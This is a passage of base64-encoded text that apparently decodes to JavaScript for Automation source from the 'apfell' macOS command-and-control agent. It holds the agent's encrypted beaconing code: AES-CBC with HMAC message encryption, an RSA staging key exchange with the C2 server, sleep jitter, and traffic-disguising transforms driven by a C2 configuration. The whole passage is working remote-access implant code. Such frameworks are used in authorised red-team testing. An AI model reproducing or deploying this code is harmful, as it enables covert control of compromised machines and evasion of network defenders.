lwdGlvbk1vZGUiKSwgJCgiU2VjTW9kZUNCQ0tleSIpLCBlcnIpOwoKICAgICAgICAvL2dlbmVyYXRlIGEgcmFuZG9tIElWIHRvIHVzZQoJICAgIGxldCBJViA9ICQuTlNNdXRhYmxlRGF0YS5kYXRhV2l0aExlbmd0aCgxNik7CgkgICAgJC5TZWNSYW5kb21Db3B5Qnl0ZXMoJC5rU2VjUmFuZG9tRGVmYXVsdCwgMTYsIElWLmJ5dGVzKTsKCSAgICBiID0gJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZW5jcnlwdCwgJCgiU2VjSVZLZXkiKSwgSVYsIGVycik7CgkgICAgLy8gc2V0IG91ciBkYXRhIHRvIGJlIGVuY3J5cHRlZAoJICAgIGxldCBuc2RhdGEgPSAkKGRhdGEpLmRhdGFVc2luZ0VuY29kaW5nKCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpOwogICAgICAgIGI9JC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZW5jcnlwdCwgJC5rU2VjVHJhbnNmb3JtSW5wdXRBdHRyaWJ1dGVOYW1lLCBuc2RhdGEsIGVycik7CiAgICAgICAgLy8kLkNGU2hvdyhlcnJbMF0pOwogICAgICAgIGxldCBlbmNyeXB0ZWREYXRhID0gJC5TZWNUcmFuc2Zvcm1FeGVjdXRlKGVuY3J5cHQsIGVycik7CiAgICAgICAgLy8gbm93IHdlIG5lZWQgdG8gcHJlcGVuZCB0aGUgSVYgdG8gdGhlIGVuY3J5cHRlZCBkYXRhIGJlZm9yZSB3ZSBiYXNlNjQgZW5jb2RlIGFuZCByZXR1cm4gaXQKICAgICAgICAvL2dlbmVyYXRlIHRoZSBobWFjCgkgICAgbGV0IGhtYWNfdHJhbnNmb3JtID0gJC5TZWNEaWdlc3RUcmFuc2Zvcm1DcmVhdGUoJCgiSE1BQy1TSEEyIERpZ2VzdCBGYW1pbHkiKSwgMjU2LCBlcnIpOwoJICAgIGxldCBobWFjX2lucHV0ID0gJC5OU011dGFibGVEYXRhLmRhdGFXaXRoTGVuZ3RoKDApOwoJICAgIGhtYWNfaW5wdXQuYXBwZW5kRGF0YShJVik7CgkgICAgaG1hY19pbnB1dC5hcHBlbmREYXRhKGVuY3J5cHRlZERhdGEpOwoJCWI9JC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoaG1hY190cmFuc2Zvcm0sICQua1NlY1RyYW5zZm9ybUlucHV0QXR0cmlidXRlTmFtZSwgaG1hY19pbnB1dCwgZXJyKTsKCQliPSQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGhtYWNfdHJhbnNmb3JtLCAkLmtTZWNEaWdlc3RITUFDS2V5QXR0cmlidXRlLCAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHRoaXMuYWVzX3BzayksIGVycik7CgkJbGV0IGhtYWNfZGF0YSA9ICQuU2VjVHJhbnNmb3JtRXhlY3V0ZShobWFjX3RyYW5zZm9ybSwgZXJyKTsKCiAgICAgICAgbGV0IGZpbmFsX21lc3NhZ2UgPSAkLk5TTXV0YWJsZURhdGEuZGF0YVdpdGhMZW5ndGgoMCk7CiAgICAgICAgZmluYWxfbWVzc2FnZS5hcHBlbmREYXRhKCAkKHVpZCkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZykgKTsKICAgICAgICBmaW5hbF9tZXNzYWdlLmFwcGVuZERhdGEoSVYpOwogICAgICAgIGZpbmFsX21lc3NhZ2UuYXBwZW5kRGF0YShlbmNyeXB0ZWREYXRhKTsKICAgICAgICBmaW5hbF9tZXNzYWdlLmFwcGVuZERhdGEoaG1hY19kYXRhKTsKICAgICAgICByZXR1cm4gZmluYWxfbWVzc2FnZS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCk7Cgl9CglkZWNyeXB0X21lc3NhZ2UobnNkYXRhKXsKICAgICAgICAvL3Rha2VzIGluIGEgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRvIGJlIGRlY3J5cHRlZCBhbmQgcmV0dXJuZWQKICAgICAgICAvL2NvbnNvbGUubG9nKCJjYWxsZWQgZGVjcnlwdCIpOwogICAgICAgIGxldCBlcnIgPSBSZWYoKTsKICAgICAgICBsZXQgZGVjcnlwdCA9ICQuU2VjRGVjcnlwdFRyYW5zZm9ybUNyZWF0ZSh0aGlzLmNyeXB0b2tleSwgZXJyKTsKICAgICAgICAkLlNlY1RyYW5zZm9ybVNldEF0dHJpYnV0ZShkZWNyeXB0LCAkKCJTZWNQYWRkaW5nS2V5IiksICQoIlNlY1BhZGRpbmdQS0NTN0tleSIpLCBlcnIpOwoJICAgICQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGRlY3J5cHQsICQoIlNlY0VuY3J5cHRpb25Nb2RlIiksICQoIlNlY01vZGVDQkNLZXkiKSwgZXJyKTsKCSAgICAvL2NvbnNvbGUubG9nKCJtYWtpbmcgcmFuZ2VzIik7CiAgICAgICAgLy9uZWVkIHRvIGV4dHJhY3Qgb3V0IHRoZSBmaXJzdCAxNiBieXRlcyBhcyB0aGUgSVYgYW5kIHRoZSByZXN0IGlzIHRoZSBtZXNzYWdlIHRvIGRlY3J5cHQKICAgICAgICBsZXQgaXZfcmFuZ2UgPSAkLk5TTWFrZVJhbmdlKDAsIDE2KTsKICAgICAgICBsZXQgbWVzc2FnZV9yYW5nZSA9ICQuTlNNYWtlUmFuZ2UoMTYsIG5zZGF0YS5sZW5ndGggLSA0OCk7IC8vIDE2IGZvciBJViAzMiBmb3IgaG1hYwogICAgICAgIGxldCBobWFjX3JhbmdlID0gJC5OU01ha2VSYW5nZShuc2RhdGEubGVuZ3RoIC0gMzIsIDMyKTsKICAgICAgICBsZXQgaG1hY19kYXRhX3JhbmdlID0gJC5OU01ha2VSYW5nZSgwLCBuc2RhdGEubGVuZ3RoIC0gMzIpOyAvLyBobWFjIGluY2x1ZGVzIElWICsgY2lwaGVydGV4dAogICAgICAgIC8vY29uc29sZS5sb2coImNhcnZpbmcgb3V0IGl2Iik7CiAgICAgICAgbGV0IGl2ID0gbnNkYXRhLnN1YmRhdGFXaXRoUmFuZ2UoaXZfcmFuZ2UpOwogICAgICAgICQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGRlY3J5cHQsICQoIlNlY0lWS2V5IiksIGl2LCBlcnIpOwogICAgICAgIGxldCBtZXNzYWdlID0gbnNkYXRhLnN1YmRhdGFXaXRoUmFuZ2UobWVzc2FnZV9yYW5nZSk7CiAgICAgICAgJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoZGVjcnlwdCwgJCgiSU5QVVQiKSwgbWVzc2FnZSwgZXJyKTsKICAgICAgICAvLyBjcmVhdGUgYW4gaG1hYyBhbmQgdmVyaWZ5IGl0IG1hdGNoZXMKICAgICAgICBsZXQgbWVzc2FnZV9obWFjID0gbnNkYXRhLnN1YmRhdGFXaXRoUmFuZ2UoaG1hY19yYW5nZSk7CiAgICAgICAgbGV0IGhtYWNfdHJhbnNmb3JtID0gJC5TZWNEaWdlc3RUcmFuc2Zvcm1DcmVhdGUoJCgiSE1BQy1TSEEyIERpZ2VzdCBGYW1pbHkiKSwgMjU2LCBlcnIpOwoJCSQuU2VjVHJhbnNmb3JtU2V0QXR0cmlidXRlKGhtYWNfdHJhbnNmb3JtLCAkLmtTZWNUcmFuc2Zvcm1JbnB1dEF0dHJpYnV0ZU5hbWUsIG5zZGF0YS5zdWJkYXRhV2l0aFJhbmdlKGhtYWNfZGF0YV9yYW5nZSksIGVycik7CgkJJC5TZWNUcmFuc2Zvcm1TZXRBdHRyaWJ1dGUoaG1hY190cmFuc2Zvcm0sICQua1NlY0RpZ2VzdEhNQUNLZXlBdHRyaWJ1dGUsICQuTlNEYXRhLmFsbG9jLmluaXRXaXRoQmFzZTY0RW5jb2RpbmcodGhpcy5hZXNfcHNrKSwgZXJyKTsKCQlsZXQgaG1hY19kYXRhID0gJC5TZWNUcmFuc2Zvcm1FeGVjdXRlKGhtYWNfdHJhbnNmb3JtLCBlcnIpOwoJCWlmKGhtYWNfZGF0YS5pc0VxdWFsVG9EYXRhKG1lc3NhZ2VfaG1hYykpewoJCQlsZXQgZGVjcnlwdGVkRGF0YSA9ICQuU2VjVHJhbnNmb3JtRXhlY3V0ZShkZWNyeXB0LCBSZWYoKSk7CgkgICAgICAgIC8vY29uc29sZS5sb2coIm1ha2luZyBhIHN0cmluZyBmcm9tIHRoZSBtZXNzYWdlIik7CgkgICAgICAgIGxldCBkZWNyeXB0ZWRfbWVzc2FnZSA9ICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoZGVjcnlwdGVkRGF0YSwgJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CgkgICAgICAgIC8vY29uc29sZS5sb2coZGVjcnlwdGVkX21lc3NhZ2UuanMpOwoJICAgICAgICByZXR1cm4gZGVjcnlwdGVkX21lc3NhZ2U7CgkJfQoJCWVsc2V7CgkJCXJldHVybiB1bmRlZmluZWQ7CgkJfQoJfQogICAgbmVnb3RpYXRlX2tleSgpewogICAgICAgIC8vIEdlbmVyYXRlIGEgcHVibGljL3ByaXZhdGUga2V5IHBhaXIKICAgICAgICBsZXQgcGFyYW1ldGVycyA9ICQoeyJ0eXBlIjogJCgiNDIiKSwgImJzaXoiOiA0MDk2LCAicGVybSI6IGZhbHNlfSk7CiAgICAgICAgbGV0IGVyciA9IFJlZigpOwogICAgICAgIGxldCBwcml2YXRla2V5ID0gJC5TZWNLZXlDcmVhdGVSYW5kb21LZXkocGFyYW1ldGVycywgZXJyKTsKICAgICAgICAvL2NvbnNvbGUubG9nKCJnZW5lcmF0ZWQgbmV3IGtleSIpOwogICAgICAgIGxldCBwdWJsaWNrZXkgPSAkLlNlY0tleUNvcHlQdWJsaWNLZXkocHJpdmF0ZWtleSk7CiAgICAgICAgbGV0IGV4cG9ydGVkX3B1YmxpYyA9ICQuU2VjS2V5Q29weUV4dGVybmFsUmVwcmVzZW50YXRpb24ocHVibGlja2V5LCBlcnIpOwogICAgICAgIC8vJC5DRlNob3coJC5DRk1ha2VDb2xsZWN0YWJsZShlcnJbMF0pKTsKICAgICAgICB0cnl7CiAgICAgICAgCS8vdGhpcyBpcyB0aGUgY2F0YWxpbmEgY2FzZQogICAgICAgIAlsZXQgYjY0X2V4cG9ydGVkX3B1YmxpYyA9ICQuQ0ZNYWtlQ29sbGVjdGFibGUoZXhwb3J0ZWRfcHVibGljKTsKICAgICAgICAJYjY0X2V4cG9ydGVkX3B1YmxpYyA9IGI2NF9leHBvcnRlZF9wdWJsaWMuYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzOyAvLyBnZXQgYSBiYXNlNjQgZW5jb2RlZCBzdHJpbmcgdmVyc2lvbgogICAgICAgIAlleHBvcnRlZF9wdWJsaWMgPSBiNjRfZXhwb3J0ZWRfcHVibGljOwogICAgICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgCS8vdGhpcyBpcyB0aGUgbW9qYXZlIGFuZCBoaWdoIHNpZXJyYSBjYXNlCiAgICAgICAgCWV4cG9ydGVkX3B1YmxpYyA9IGV4cG9ydGVkX3B1YmxpYy5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7CiAgICAgICAgfQogICAgICAgIGxldCBzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5IjsKCSAgICBsZXQgc2Vzc2lvbl9rZXkgPSBBcnJheSgyMCkuam9pbigpLnNwbGl0KCcsJykubWFwKGZ1bmN0aW9uKCkgeyByZXR1cm4gcy5jaGFyQXQoTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogcy5sZW5ndGgpKTsgfSkuam9pbignJyk7CgkgICAgbGV0IGluaXRpYWxfbWVzc2FnZSA9IHsic2Vzc2lvbl9pZCI6IHNlc3Npb25fa2V5LCAicHViX2tleSI6IGV4cG9ydGVkX3B1YmxpYywgImFjdGlvbiI6ICJzdGFnaW5nX3JzYSJ9OwoJICAgLy8gRW5jcnlwdCBvdXIgaW5pdGlhbCBtZXNzYWdlIHdpdGggc2Vzc2lvbklEIGFuZCBQdWJsaWMga2V5IHdpdGggdGhlIGluaXRpYWwgQUVTIGtleQogICAgd2hpbGUodHJ1ZSl7CiAgICAgIHRyeXsKICAgICAgICAvL2xldCByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMucG9zdF9tZXNzYWdlcyksIGluaXRpYWxfbWVzc2FnZSwgYXBmZWxsLnV1aWQpOwogICAgICAgIC8vbGV0IHN0YWdlMSA9IHRoaXMubWFrZV9yZXF1ZXN0KHJlcSk7CiAgICAgICAgbGV0IHN0YWdlMSA9IHRoaXMubWFrZV9yZXF1ZXN0KCJQT1NUIiwgYXBmZWxsLnV1aWQsIGluaXRpYWxfbWVzc2FnZSk7CiAgICAgICAgbGV0IGVuY19rZXkgPSAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHN0YWdlMVsnc2Vzc2lvbl9rZXknXSk7CiAgICAgICAgbGV0IGRlY19rZXkgPSAkLlNlY0tleUNyZWF0ZURlY3J5cHRlZERhdGEocHJpdmF0ZWtleSwgJC5rU2VjS2V5QWxnb3JpdGhtUlNBRW5jcnlwdGlvbk9BRVBTSEExLCBlbmNfa2V5LCBlcnIpOwogICAgICAgIC8vIEFkanVzdCBvdXIgZ2xvYmFsIGtleSBpbmZvcm1hdGlvbiB3aXRoIHRoZSBuZXdseSBhZGp1c3RlZCBzZXNzaW9uIGtleQogICAgICAgIHRyeXsKICAgICAgICAgICAgdGhpcy5hZXNfcHNrID0gZGVjX2tleS5iYXNlNjRFbmNvZGVkU3RyaW5nV2l0aE9wdGlvbnMoMCkuanM7IC8vIGJhc2U2NCBlbmNvZGVkIGtleQogICAgICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgICAgIGxldCBkZWNfa2V5X2NvbGxlY3RhYmxlID0gJC5DRk1ha2VDb2xsZWN0YWJsZShkZWNfa2V5KTsKICAgICAgICAgICAgZGVjX2tleV9jb2xsZWN0YWJsZSA9IGRlY19rZXlfY29sbGVjdGFibGUuYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzOwogICAgICAgICAgICB0aGlzLmFlc19wc2sgPSBkZWNfa2V5X2NvbGxlY3RhYmxlOwogICAgICAgIH0KICAgICAgICAvL2NvbnNvbGUubG9nKEpTT04uc3RyaW5naWZ5KGpzb25fcmVzcG9uc2UpKTsKICAgICAgICB0aGlzLnBhcmFtZXRlcnMgPSAkKHsidHlwZSI6ICQua1NlY0F0dHJLZXlUeXBlQUVTfSk7CiAgICAgICAgdGhpcy5yYXdfa2V5ID0gJC5OU0RhdGEuYWxsb2MuaW5pdFdpdGhCYXNlNjRFbmNvZGluZyh0aGlzLmFlc19wc2spOwogICAgICAgIHRoaXMuY3J5cHRva2V5ID0gJC5TZWNLZXlDcmVhdGVGcm9tRGF0YSh0aGlzLnBhcmFtZXRlcnMsIHRoaXMucmF3X2tleSwgUmVmKCkpOwogICAgICAgIHRoaXMuZXhjaGFuZ2luZ19rZXlzID0gZmFsc2U7CiAgICAgICAgcmV0dXJuIHN0YWdlMVsndXVpZCddOwogICAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIC8vY29uc29sZS5sb2coImVycm9yIGluIG5lZ290aWF0ZV9rZXk6ICIgKyBlcnJvci50b1N0cmluZygpKTsKICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7ICAvLyBkb24ndCBzcGluIG91dCBjcmF6eSBpZiB0aGUgY29ubmVjdGlvbiBmYWlscwogICAgICB9CiAgICB9CiAgfQogIGdlbl9zbGVlcF90aW1lKCl7CiAgICAgIC8vZ2VuZXJhdGUgYSB0aW1lIHRoYXQncyB0aGlzLmludGVydmFsICs9ICh0aGlzLmludGVydmFsICogMS90aGlzLmppdHRlcikKICAgICAgbGV0IHBsdXNfbWluID0gTWF0aC5yb3VuZChNYXRoLnJhbmRvbSgpKTsKICAgICAgaWYocGx1c19taW4gPT09IDEpewogICAgICAgICAgcmV0dXJuIHRoaXMuaW50ZXJ2YWwgKyAodGhpcy5pbnRlcnZhbCAqIChNYXRoLnJvdW5kKE1hdGgucmFuZG9tKCkqdGhpcy5qaXR0ZXIpLzEwMCkpOwogICAgICB9ZWxzZXsKICAgICAgICAgIHJldHVybiB0aGlzLmludGVydmFsIC0gKHRoaXMuaW50ZXJ2YWwgKiAoTWF0aC5yb3VuZChNYXRoLnJhbmRvbSgpKnRoaXMuaml0dGVyKS8xMDApKTsKICAgICAgfQogICAgfQogIHByZXBlbmQoKXsKICAgIHJldHVybiBhcmd1bWVudHNbMV0gKyBhcmd1bWVudHNbMF07CiAgfQogIHJfcHJlcGVuZCgpewogICAgcmV0dXJuIGFyZ3VtZW50c1swXS5zbGljZShTdHJpbmcoYXJndW1lbnRzWzFdKS5sZW5ndGgpOwogIH0KICBhcHBlbmQoKXsKICAgIHJldHVybiBhcmd1bWVudHNbMF0gKyBhcmd1bWVudHNbMV07CiAgfQogIHJfYXBwZW5kKCl7CiAgICByZXR1cm4gYXJndW1lbnRzWzBdLnNsaWNlKDAsIC0xICogU3RyaW5nKGFyZ3VtZW50c1sxXSkubGVuZ3RoKTsKICB9CiAgYjY0KCl7CiAgICByZXR1cm4gYmFzZTY0X2VuY29kZShTdHJpbmcoYXJndW1lbnRzWzBdKSk7CiAgfQogIHJfYjY0KCl7CiAgICByZXR1cm4gYmFzZTY0X2RlY29kZShTdHJpbmcoYXJndW1lbnRzWzBdKSk7CiAgfQogIHJhbmRvbV9taXhlZCgpewogICAgICBsZXQgbSA9IFsuLi5BcnJheShOdW1iZXIoYXJndW1lbnRzWzFdKSldLm1hcChpPT4ofn4oTWF0aC5yYW5kb20oKSozNikpLnRvU3RyaW5nKDM2KSkuam9pbignJyk7CiAgICAgIHJldHVybiBhcmd1bWVudHNbMF0gKyBtOwogIH0KICByX3JhbmRvbV9taXhlZCgpewogICAgICByZXR1cm4gYXJndW1lbnRzWzBdLnNsaWNlKDAsIC0xICogTnVtYmVyKGFyZ3VtZW50c1sxXSkpOwogICAgfQogIHJhbmRvbV9udW1iZXIoKXsKICAgICAgbGV0IG0gPSBbLi4uQXJyYXkoTnVtYmVyKGFyZ3VtZW50c1sxXSkpXS5tYXAoaT0+KH5+KE1hdGgucmFuZG9tKCkqMTApKS50b1N0cmluZygxMCkpLmpvaW4oJycpOwogICAgICByZXR1cm4gYXJndW1lbnRzWzBdICsgbTsKICB9CiAgcl9yYW5kb21fbnVtYmVyKCl7CiAgICAgIHJldHVybiBhcmd1bWVudHNbMF0uc2xpY2UoMCwgLTEgKiBOdW1iZXIoYXJndW1lbnRzWzFdKSk7CiAgICB9CiAgcmFuZG9tX2FscGhhKCl7CiAgICAgIGxldCBzID0gImFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiOwogICAgICBsZXQgbSA9IEFycmF5KE51bWJlcihhcmd1bWVudHNbMV0pKS5qb2luKCkuc3BsaXQoJywnKS5tYXAoZnVuY3Rpb24oKSB7IHJldHVybiBzLmNoYXJBdChNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBzLmxlbmd0aCkpOyB9KS5qb2luKCcnKTsKICAgICAgcmV0dXJuIGFyZ3VtZW50c1swXSArIG07CiAgfQogIHJfcmFuZG9tX2FscGhhKCl7CiAgICAgIHJldHVybiBhcmd1bWVudHNbMF0uc2xpY2UoMCwgLTEgKiBOdW1iZXIoYXJndW1lbnRzWzFdKSk7CiAgICB9CiAgY2hvb3NlX3JhbmRvbSgpewogICAgICAgIGxldCBjaG9pY2UgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqIGFyZ3VtZW50c1sxXS5sZW5ndGgpOwogICAgICAgIGlmKGNob2ljZSA9PT0gYXJndW1lbnRzWzFdLmxlbmd0aCl7Y2hvaWNlIC09IDE7fQogICAgICAgIHJldHVybiBhcmd1bWVudHNbMF0gKyBhcmd1bWVudHNbMV1bY2hvaWNlXTsKICAgIH0KICAgIHJfY2hvb3NlX3JhbmRvbSgpewoJICAgIGZvcihsZXQgaSA9IDA7IGkgPCBhcmd1bWVudHNbMV0ubGVuZ3RoOyBpKyspewoJICAgICAgICBpZihhcmd1bWVudHNbMF0uaW5jbHVkZXMoYXJndW1lbnRzWzFdW2ldKSl7CgkgICAgICAgICAgICByZXR1cm4gYXJndW1lbnRzWzBdLnJlcGxhY2UoYXJndW1lbnRzWzFdW2ldLCAiIik7CiAgICAgICAgICAgIH0KICAgICAgICB9CgkgICAgcmV0dXJuIGFyZ3VtZW50c1swXTsKICAgIH0KICAgIGdldF92YWx1ZSh2YWx1ZSwgdHJhbnNmb3Jtcyl7CiAgICAgIGxldCB0bXAgPSB2YWx1ZTsKICAgICAgdHJ5IHsKICAgICAgICAgIGlmICh0cmFuc2Zvcm1zLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICBmb3IgKGxldCBpID0gdHJhbnNmb3Jtcy5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgewogICAgICAgICAgICAgICAgICBzd2l0Y2ggKHRyYW5zZm9ybXNbaV1bJ2Z1bmN0aW9uJ10pIHsKICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImJhc2U2NCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX2I2NCh0bXApOwogICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgY2FzZSAicHJlcGVuZCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX3ByZXBlbmQodG1wLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgY2FzZSAiYXBwZW5kIjoKICAgICAgICAgICAgICAgICAgICAgICAgICB0bXAgPSB0aGlzLnJfYXBwZW5kKHRtcCwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInJhbmRvbV9taXhlZCI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX3JhbmRvbV9taXhlZCh0bXAsIHRyYW5zZm9ybXNbaV1bJ3BhcmFtZXRlcnMnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICBjYXNlICJyYW5kb21fbnVtYmVyIjoKICAgICAgICAgICAgICAgICAgICAgICAgICB0bXAgPSB0aGlzLnJfcmFuZG9tX251bWJlcih0bXAsIHRyYW5zZm9ybXNbaV1bJ3BhcmFtZXRlcnMnXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICBjYXNlICJyYW5kb21fYWxwaGEiOgogICAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHRoaXMucl9yYW5kb21fYWxwaGEodG1wLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgY2FzZSAiY2hvb3NlX3JhbmRvbSI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGhpcy5yX2Nob29zZV9yYW5kb20odG1wLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgfQogICAgICAgICAgfQogICAgICAgICAgcmV0dXJuIHRtcDsKICAgICAgfWNhdGNoKGVycm9yKXsKICAgICAgICAgIHJldHVybiAiIjsKICAgICAgfQogICAgfQogICAgcmV0cmlldmVfbWVzc2FnZShyZXNwb25zZSwgbWV0aG9kPSJQT1NUIil7CiAgICAgIGxldCBkYXRhID0gdGhpcy5nZXRfdmFsdWUoKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcocmVzcG9uc2UsICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpKS5qcywgdGhpcy5jMl9jb25maWdbbWV0aG9kXVsnU2VydmVyQm9keSddKTsKICAgICAgLy9jb25zb2xlLmxvZygiaW4gcmV0cmlldmVfbWVzc2FnZSwgcmV0dXJuaW5nOiAiICsgZGF0YSk7CiAgICAgIHJldHVybiBkYXRhOwogICAgfQogICAgY3JlYXRlX3ZhbHVlKHZhbHVlLCB0cmFuc2Zvcm1zKXsKICAgICAgZm9yKGxldCBpID0gMDsgaSA8IHRyYW5zZm9ybXMubGVuZ3RoOyBpKyspewogICAgICAgIHN3aXRjaCh0cmFuc2Zvcm1zW2ldWydmdW5jdGlvbiddKXsKICAgICAgICAgIGNhc2UgImJhc2U2NCI6CiAgICAgICAgICAgICAgdmFsdWUgPSB0aGlzLmI2NCh2YWx1ZSk7CiAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICBjYXNlICJwcmVwZW5kIjoKICAgICAgICAgICAgICB2YWx1ZSA9IHRoaXMucHJlcGVuZCh2YWx1ZSwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgIGNhc2UgImFwcGVuZCI6CiAgICAgICAgICAgICAgdmFsdWUgPSB0aGlzLmFwcGVuZCh2YWx1ZSwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgIGNhc2UgInJhbmRvbV9taXhlZCI6CiAgICAgICAgICAgICAgdmFsdWUgPSB0aGlzLnJhbmRvbV9taXhlZCh2YWx1ZSwgdHJhbnNmb3Jtc1tpXVsncGFyYW1ldGVycyddKTsKICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgIGNhc2UgInJhbmRvbV9udW1iZXIiOgogICAgICAgICAgICAgIHZhbHVlID0gdGhpcy5yYW5kb21fbnVtYmVyKHZhbHVlLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgY2FzZSAicmFuZG9tX2FscGhhIjoKICAgICAgICAgICAgICB2YWx1ZSA9IHRoaXMucmFuZG9tX2FscGhhKHZhbHVlLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICJjaG9vc2VfcmFuZG9tIjoKICAgICAgICAgICAgICAgIHZhbHVlID0gdGhpcy5jaG9vc2VfcmFuZG9tKHZhbHVlLCB0cmFuc2Zvcm1zW2ldWydwYXJhbWV0ZXJzJ10pOwogICAgICAgIH0KICAgICAgfQogICAgICByZXR1cm4gdmFsdWU7CiAgICB9CiAgICBjcmVhdGVfbWVzc2FnZShlbmRwb2ludCwgZGF0YSwgYWdlbnRfaWQ9YXBmZWxsLmlkLCBtZXRob2Q9IlBPU1QiKXsKCSAgICBpZih0aGlzLmFlc19wc2sgIT09ICIiKXsKICAgICAgICAgICAgZGF0YSA9IHRoaXMuZW5jcnlwdF9tZXNzYWdlKGFnZW50X2lkLCBKU09OLnN0cmluZ2lmeShkYXRhKSkuanM7CiAgICAgICAgfWVsc2UgaWYodHlwZW9mKHNlbmREYXRhKSA9PT0gInN0cmluZyIpewogICAgICAgIAlkYXRhID0gJCh1aWQgKyBzZW5kRGF0YSkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CiAgICAgICAgICAgIGRhdGEgPSBkYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKTsKICAgICAgICB9ZWxzZXsKCSAgICAgICAgZGF0YSA9ICQoYWdlbnRfaWQgKyBKU09OLnN0cmluZ2lmeShkYXRhKSkuZGF0YVVzaW5nRW5jb2RpbmcoJC5OU1VURjhTdHJpbmdFbmNvZGluZyk7CiAgICAgICAgICAgIGRhdGEgPSBkYXRhLmJhc2U2NEVuY29kZWRTdHJpbmdXaXRoT3B0aW9ucygwKS5qczsKICAgICAgICB9CiAgICAgICAgbGV0IGJhc2VfdXJsID0gdGhpcy5nZXRfcmFuZG9tX2VsZW1lbnQoZW5kcG9pbnRbJ3VybHMnXSk7CiAgICAgICAgbGV0IGJhc2VfdXJpID0gZW5kcG9pbnRbJ3VyaSddOwogICAgICAgIGZvcihsZXQgaSBpbiBlbmRwb2ludFsndXJsRnVuY3Rpb25zJ10pewogICAgICAgICAgICBsZXQgdmFsdWUgPSBlbmRwb2ludFsndXJsRnVuY3Rpb25zJ11baV1bJ3ZhbHVlJ107CiAgICAgICAgICAgIGlmKHZhbHVlID09PSB1bmRlZmluZWQpe3ZhbHVlID0gIiI7fQogICAgICAgICAgICBpZih2YWx1ZSA9PT0gIm1lc3NhZ2UiKXt2YWx1ZSA9IGRhdGE7fQogICAgICAgICAgICB2YWx1ZSA9IHRoaXMuY3JlYXRlX3Zh